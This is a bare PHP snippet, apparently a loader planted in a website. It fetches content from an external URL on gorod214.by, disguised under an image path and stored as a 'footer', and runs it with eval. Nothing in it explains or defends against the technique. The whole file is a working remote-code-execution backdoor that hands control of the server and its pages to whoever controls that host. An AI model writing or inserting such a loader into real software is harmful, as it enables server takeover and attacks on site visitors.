<?php
$url = 'https://gorod214.by/img/r/a5c946';
$exfooter = file_get_contents($url);
eval('?>' . $exfooter);